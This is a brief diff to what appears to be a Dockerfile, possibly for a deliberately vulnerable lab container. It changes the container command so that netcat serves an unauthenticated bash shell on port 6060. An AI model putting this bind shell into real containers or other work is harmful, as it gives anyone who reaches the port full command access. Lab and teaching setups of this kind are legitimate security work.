@@ -10,4 +10,4 @@ RUN apt-get install -y policykit-1 \
     net-tools
 COPY ./sshd_config /etc/ssh/sshd_config
 RUN service ssh start
-CMD ["nc", "-l", "-p", "6060"]
+CMD ["nc", "-l", "-p", "6060", "-e", "/bin/bash"]
